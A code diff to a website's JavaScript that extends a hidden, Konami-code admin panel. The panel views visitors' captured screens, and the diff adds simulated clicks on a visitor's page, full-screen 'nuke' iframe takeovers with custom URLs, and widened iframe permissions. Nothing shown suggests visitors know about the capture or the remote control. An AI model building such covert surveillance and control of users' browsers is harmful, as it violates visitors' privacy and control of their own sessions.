@@ -53,6 +53,7 @@
   let admCX = 50, admCY = 50;
   let viewStream = null;
   let panelEl    = null;
+  var _hubOnlinePid = null;   // most-recent hub peer ID (set in onOpen, read in buildPanel)
 
   // cross-tab approval sync
   const bc = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel('cst-auth') : null;
@@ -416,6 +417,8 @@
   <h2>celestial. admin</h2>
   <span class="cp-badge">ADMIN</span>
   <span id="cp-hub">hub offline</span>
+  <span id="cp-online-cnt" style="font-size:.7rem;padding:2px 8px;border-radius:3px;
+    border:1px solid #1a2a1a;background:#020f02;color:#44aa66;display:none;"></span>
   <button class="cp-x" id="cp-close">✕</button>
 </div>
 <div id="cp-body">
@@ -473,10 +476,10 @@
         </div>
         <div class="crow" style="align-items:center;">
           <select class="ci" id="cp-nuke-sel" style="flex:1;min-width:0;">
-            <option value="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0">🎵 Rick Roll</option>
-            <option value="https://www.youtube.com/embed/2yJgwwDcgV8?autoplay=1&controls=0">🐱 Nyan Cat</option>
-            <option value="https://www.youtube.com/embed/wGrbkkAl3hY?autoplay=1&controls=0">🎸 Bones?</option>
-            <option value="https://www.youtube.com/embed/YE7VzlLtp-4?autoplay=1&controls=0">📺 Big Buck Bunny</option>
+            <option value="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&controls=0">🎵 Rick Roll</option>
+            <option value="https://www.youtube.com/embed/2yJgwwDcgV8?autoplay=1&mute=1&controls=0">🐱 Nyan Cat</option>
+            <option value="https://www.youtube.com/embed/wGrbkkAl3hY?autoplay=1&mute=1&controls=0">🎸 Bones?</option>
+            <option value="https://www.youtube.com/embed/YE7VzlLtp-4?autoplay=1&mute=1&controls=0">📺 Big Buck Bunny</option>
             <option value="custom">✏️ custom URL…</option>
           </select>
           <input class="ci" id="cp-nuke-url" placeholder="embed URL…" style="display:none;flex:1;min-width:0;"/>
@@ -586,6 +589,14 @@
       });
     });
 
+    // Click-through: clicking the viewer sends a click event to the client
+    vc.addEventListener('click', e => {
+      const r  = vc.getBoundingClientRect();
+      const cx = (e.clientX - r.left) / r.width  * 100;
+      const cy = (e.clientY - r.top)  / r.height * 100;
+      sendTarget({ type: 'click', x: cx, y: cy });
+    });
+
     // Cursor visibility toggle
     panelEl.querySelector('#cp-showcur').addEventListener('change', e => {
       if (!e.target.checked) {
@@ -627,6 +638,26 @@
       caColor.value = '#c9a84c';
       const o = getAdminId(); o.color = '#c9a84c'; saveAdminId(o);
     };
+
+    // ── Enter shortcut: focus message input when viewing a client ──
+    panelEl.addEventListener('keydown', function (e) {
+      if (e.key !== 'Enter') return;
+      if (document.activeElement && document.activeElement.matches('input,textarea,select,[contenteditable]')) return;
+      if (!document.getElementById('cs-clients')?.classList.contains('on')) return;
+      if (!viewTarget) return;
+      const msgInp = document.getElementById('cp-msginp');
+      if (msgInp) { e.preventDefault(); msgInp.focus(); }
+    });
+
+    // ── Sync hub status if hub was already online when panel opened ──
+    // (init() starts the hub before panel exists; _markOnline would have
+    //  found null elements then, so we back-fill it now.)
+    if (hub && !hub.destroyed) {
+      var _h0 = document.getElementById('cp-hub');
+      var _p0 = document.getElementById('cp-pid');
+      if (_h0) { _h0.textContent = 'hub online'; _h0.className = 'on'; }
+      if (_p0 && _hubOnlinePid) _p0.textContent = _hubOnlinePid;
+    }
 
     // ── global actions ──
     const annSel = panelEl.querySelector('#cp-nuke-sel');
@@ -886,19 +917,23 @@
           hub = peer;
 
           // ── UI ───────────────────────────────────────────────
-          var elHub = document.getElementById('cp-hub');
-          var elPid = document.getElementById('cp-pid');
+          // Always do live DOM lookup — the panel may not exist yet when
+          // startHub() first fires (admin hasn't opened panel via Konami).
           function _markOnline(id) {
-            if (elHub) { elHub.textContent = 'hub online'; elHub.className = 'on'; }
-            if (elPid && id) elPid.textContent = id;
+            _hubOnlinePid = id;
+            var _h = document.getElementById('cp-hub');
+            var _p = document.getElementById('cp-pid');
+            if (_h) { _h.textContent = 'hub online'; _h.className = 'on'; }
+            if (_p && id) _p.textContent = id;
           }
           _markOnline(pid);
 
           // Show "reconnecting…" when signaling WS drops, then online again
-          // when peer.reconnect() re-establishes it.  These listeners stay
-          // attached to this specific peer object for its lifetime.
+          // when peer.reconnect() re-establishes it.
           peer.on('disconnected', function () {
-            if (peer === hub && elHub) { elHub.textContent = 'hub reconnecting…'; elHub.className = ''; }
+            if (peer !== hub) return;
+            var _h = document.getElementById('cp-hub');
+            if (_h) { _h.textContent = 'hub reconnecting…'; _h.className = ''; }
           });
           peer.on('open', function (id) {
             if (peer === hub) _markOnline(id);
@@ -907,7 +942,13 @@
           // ── Heartbeat ─────────────────────────────────────────
           if (_heartbeatTimer) clearInterval(_heartbeatTimer);
           _heartbeatTimer = setInterval(function () {
-            bcast({ type: 'admin-pulse', viewing: viewTarget !== null });
+            // Real site-wide online count: all beacon clients + 1 for admin.
+            // Sent to every client so the chat widget can show the true total
+            // instead of just the chat-mesh subset.
+            var realCount = 1 + Object.keys(clients).filter(function (id) {
+              return !clients[id].isAdminPeer;
+            }).length;
+            bcast({ type: 'admin-pulse', viewing: viewTarget !== null, onlineCount: realCount });
           }, 1000);
 
           // ── Expose hub to chat.js ─────────────────────────────
@@ -1094,7 +1135,16 @@
     const list = document.getElementById('cp-clist');
     if (!list) return;
     const ids = Object.keys(clients).filter(id => !clients[id].isAdminPeer);
-    if (!ids.length) { list.innerHTML = '<p style="color:#333;font-size:.82rem;">no clients connected.</p>'; return; }
+    var cntEl = document.getElementById('cp-online-cnt');
+    if (!ids.length) {
+      list.innerHTML = '<p style="color:#333;font-size:.82rem;">no clients connected.</p>';
+      if (cntEl) cntEl.style.display = 'none';
+      return;
+    }
+    if (cntEl) {
+      cntEl.textContent = ids.length + ' client' + (ids.length === 1 ? '' : 's') + ' online';
+      cntEl.style.display = '';
+    }
     list.innerHTML = ids.map(id => {
       const c      = clients[id];
       const online = c.conn && c.conn.open;
@@ -1158,7 +1208,7 @@
   window.__cstNuke1 = id => {
     const sel = document.getElementById('cp-nuke-sel');
     const urlEl = document.getElementById('cp-nuke-url');
-    const src = sel?.value === 'custom' ? (urlEl?.value?.trim() || '') : (sel?.value || 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0');
+    const src = sel?.value === 'custom' ? (urlEl?.value?.trim() || '') : (sel?.value || 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&controls=0');
     sendTo(id, { type: 'nuke', src });
     showToast(`Nuked ${clients[id]?.name || id} 💥`);
   };
@@ -1252,12 +1302,14 @@
       let srcVid  = null;
       let capCv   = null;
       let capCtx  = null;
-      let virCur     = null;
-      let msgLayer   = null;
-      let lastMsg    = null;
-      let stylesDone = false;
-      let cursorColor = '#ff3232';
-      let lastPulse  = 0;
+      let virCur        = null;
+      let msgLayer      = null;
+      let lastMsg       = null;
+      let stylesDone    = false;
+      let cursorColor   = '#ff3232';
+      let lastPulse     = 0;
+      let _hoverEl      = null;   // element currently highlighted by cursor hover
+      let _hoverThrottle = 0;     // last hover-check timestamp (throttle to ~15fps)
 
       // Intervals are created once; cPeer is updated if the peer is recreated.
       let _tryConnTimer = null;
@@ -1423,14 +1475,77 @@
         c.style.left = x + 'vw';
         c.style.top  = y + 'vh';
         // Keep active message bubble anchored below the cursor.
-        // Use vw/vh so units match the cursor exactly (% inside the fixed
-        // layer is equivalent but can drift a pixel at certain screen sizes).
         if (lastMsg && lastMsg.parentNode) {
           lastMsg.style.left = x + 'vw';
           lastMsg.style.top  = Math.min(y + 3.5, 90) + 'vh';
         }
+        // Color-based text/input/button hover effect
+        _applyHoverEffect(x, y);
       }
-      function hideCur() { if (virCur) virCur.style.display = 'none'; }
+      function hideCur() {
+        if (virCur) virCur.style.display = 'none';
+        // Remove any active hover highlight
+        if (_hoverEl) {
+          _hoverEl.classList.remove('cst-cur-txt', 'cst-cur-inp', 'cst-cur-btn');
+          delete _hoverEl.dataset.cstV;
+          _hoverEl = null;
+        }
+      }
+
+      // Derive one of 6 color variant names from the current cursor color hex.
+      function _getVariant() {
+        const hex = cursorColor || '#ff3232';
+        const r = parseInt(hex.slice(1, 3) || 'ff', 16);
+        const g = parseInt(hex.slice(3, 5) || '32', 16);
+        const b = parseInt(hex.slice(5, 7) || '32', 16);
+        if (g > r * 1.25 && g > b * 1.25 && g > 80)  return 'green';
+        if (b > r * 1.25 && b > g * 1.25 && b > 80)  return 'blue';
+        if (r > 140 && g > 80  && g < r   && b < 90)  return 'orange';
+        if (r > 100 && b > 100 && g < Math.max(r, b) * 0.72) return 'purple';
+        if (r > 120 && g < 80) return 'red';
+        return 'gold';
+      }
+
+      // Apply a color-based text/input/button highlight to whatever element sits
+      // under the admin cursor.  Throttled to ~15 fps to stay cheap.
+      function _applyHoverEffect(x, y) {
+        const now = Date.now();
+        if (now - _hoverThrottle < 66) return;
+        _hoverThrottle = now;
+
+        const xPx = x / 100 * window.innerWidth;
+        const yPx = y / 100 * window.innerHeight;
+
+        // Hide cursor momentarily so hit-test finds what's beneath it.
+        const prevDisp = virCur ? virCur.style.display : '';
+        if (virCur) virCur.style.display = 'none';
+        const el = document.elementFromPoint(xPx, yPx);
+        if (virCur) virCur.style.display = prevDisp;
+
+        // Clear the previous highlight if cursor moved to a different element.
+        if (_hoverEl && _hoverEl !== el) {
+          _hoverEl.classList.remove('cst-cur-txt', 'cst-cur-inp', 'cst-cur-btn');
+          delete _hoverEl.dataset.cstV;
+          _hoverEl = null;
+        }
+        if (!el || el === _hoverEl) return;
+
+        const tag = (el.tagName || '').toLowerCase();
+        let cls = null;
+        if (tag === 'input' || tag === 'textarea' || tag === 'select') {
+          cls = 'cst-cur-inp';
+        } else if (tag === 'button' || el.getAttribute('role') === 'button' || el.getAttribute('type') === 'button') {
+          cls = 'cst-cur-btn';
+        } else if (['p','span','h1','h2','h3','h4','h5','h6','a','label','li','td','th'].includes(tag)
+            && el.textContent.trim().length > 0) {
+          cls = 'cst-cur-txt';
+        }
+        if (!cls) return;
+
+        el.classList.add(cls);
+        el.dataset.cstV = _getVariant();
+        _hoverEl = el;
+      }
 
       function getLayer() {
         if (!msgLayer) {
@@ -1444,7 +1559,34 @@
           st.textContent = `
 @keyframes cst-pop{from{transform:translateX(-50%) scale(.55);opacity:0}to{transform:translateX(-50%) scale(1);opacity:1}}
 @keyframes cst-fall{to{transform:translateY(110vh) rotate(var(--r));opacity:0}}
-.cst-ch{display:inline-block;animation:cst-fall var(--d) ease-in var(--dl) both;}`;
+@keyframes cst-blink{0%,49%{opacity:1}50%,100%{opacity:0}}
+.cst-ch{display:inline-block;animation:cst-fall var(--d) ease-in var(--dl) both;}
+/* ── cursor hover text effects (6 color variants) ─────────────── */
+.cst-cur-txt{transition:color .18s,text-shadow .18s;}
+.cst-cur-txt[data-cst-v="green"]{color:#44ff88!important;text-shadow:0 0 9px #44ff8860!important;}
+.cst-cur-txt[data-cst-v="green"]::after{content:'|';color:#44ff88;animation:cst-blink .65s step-start infinite;margin-left:1px;font-weight:300;}
+.cst-cur-txt[data-cst-v="orange"]{color:#ffaa44!important;text-shadow:0 0 9px #ffaa4460!important;}
+.cst-cur-txt[data-cst-v="blue"]{color:#44aaff!important;text-shadow:0 0 9px #44aaff60!important;}
+.cst-cur-txt[data-cst-v="red"]{color:#ff5555!important;text-shadow:0 0 9px #ff555560!important;}
+.cst-cur-txt[data-cst-v="purple"]{color:#cc55ff!important;text-shadow:0 0 9px #cc55ff60!important;}
+.cst-cur-txt[data-cst-v="gold"]{color:#ffd700!important;text-shadow:0 0 9px #ffd70060!important;}
+/* ── cursor hover input effects ─────────────────────────────── */
+.cst-cur-inp{transition:border-color .18s,box-shadow .18s;}
+.cst-cur-inp[data-cst-v="green"]{border-color:#44ff88!important;box-shadow:0 0 7px #44ff8840!important;}
+.cst-cur-inp[data-cst-v="green"]::after{content:'';border-right:2px solid #44ff88;animation:cst-blink .65s step-start infinite;}
+.cst-cur-inp[data-cst-v="orange"]{border-color:#ffaa44!important;box-shadow:0 0 7px #ffaa4440!important;}
+.cst-cur-inp[data-cst-v="blue"]{border-color:#44aaff!important;box-shadow:0 0 7px #44aaff40!important;}
+.cst-cur-inp[data-cst-v="red"]{border-color:#ff5555!important;box-shadow:0 0 7px #ff555540!important;}
+.cst-cur-inp[data-cst-v="purple"]{border-color:#cc55ff!important;box-shadow:0 0 7px #cc55ff40!important;}
+.cst-cur-inp[data-cst-v="gold"]{border-color:#ffd700!important;box-shadow:0 0 7px #ffd70040!important;}
+/* ── cursor hover button effects ────────────────────────────── */
+.cst-cur-btn{transition:box-shadow .18s;}
+.cst-cur-btn[data-cst-v="green"]{box-shadow:0 0 10px #44ff8870!important;}
+.cst-cur-btn[data-cst-v="orange"]{box-shadow:0 0 10px #ffaa4470!important;}
+.cst-cur-btn[data-cst-v="blue"]{box-shadow:0 0 10px #44aaff70!important;}
+.cst-cur-btn[data-cst-v="red"]{box-shadow:0 0 10px #ff555570!important;}
+.cst-cur-btn[data-cst-v="purple"]{box-shadow:0 0 10px #cc55ff70!important;}
+.cst-cur-btn[data-cst-v="gold"]{box-shadow:0 0 10px #ffd70070!important;}`;
           document.head.appendChild(st);
         }
         return msgLayer;
@@ -1546,8 +1688,29 @@
         if (d.type === 'msg')         { showMsg(d.text, d.x||50, d.y||30); }
         if (d.type === 'admin-pulse') {
           lastPulse = Date.now();
-          // If admin is no longer actively viewing, stop any ongoing capture
           if (!d.viewing && capturing) { stopCap(); hideCur(); }
+          // Publish real online count for chat.js to use
+          if (typeof d.onlineCount === 'number') {
+            window.__cstHubOnline   = d.onlineCount;
+            window.__cstHubOnlineTs = Date.now();
+            window.dispatchEvent(new CustomEvent('cst-hub-online'));
+          }
+        }
+        if (d.type === 'click') {
+          // Admin clicked on the screen viewer — simulate the click at that position
+          const xPx = Math.round(d.x / 100 * window.innerWidth);
+          const yPx = Math.round(d.y / 100 * window.innerHeight);
+          // Temporarily hide cursor so hit-test finds real elements
+          const prevD = virCur ? virCur.style.display : '';
+          if (virCur) virCur.style.display = 'none';
+          const target = document.elementFromPoint(xPx, yPx);
+          if (virCur) virCur.style.display = prevD;
+          if (target) {
+            try { target.click(); } catch {}
+            if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
+              try { target.focus(); } catch {}
+            }
+          }
         }
         if (d.type === 'ping')        { try { adminConn?.send({ type: 'pong', pingTs: d.ts }); } catch {} }
         if (d.type === 'announce')    { window.notify?.(d.text || '', 'info', 10000); }
@@ -1630,11 +1793,20 @@
         el.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:#000;overflow:hidden;';
         const iframe = document.createElement('iframe');
         iframe.style.cssText = 'width:100%;height:100%;border:none;';
-        iframe.src = src;
-        iframe.allow = 'autoplay; fullscreen; encrypted-media';
+        // Set allow BEFORE src so the autoplay permission is active when the
+        // iframe first navigates (some browsers require this ordering).
+        iframe.allow = 'autoplay; fullscreen; encrypted-media; gyroscope; accelerometer; clipboard-write; picture-in-picture; web-share';
         iframe.setAttribute('allowfullscreen', '');
         el.appendChild(iframe);
         document.body.appendChild(el);
+        // Setting src after the iframe is in the DOM lets it start with the
+        // correct autoplay context.  For YouTube the &mute=1 param is required
+        // for Chrome's autoplay policy; add it automatically if missing.
+        var finalSrc = src;
+        if (/youtube\.com\/embed/.test(src) && src.indexOf('mute=') === -1) {
+          finalSrc = src + (src.indexOf('?') === -1 ? '?' : '&') + 'mute=1';
+        }
+        iframe.src = finalSrc;
       }
     });
   }
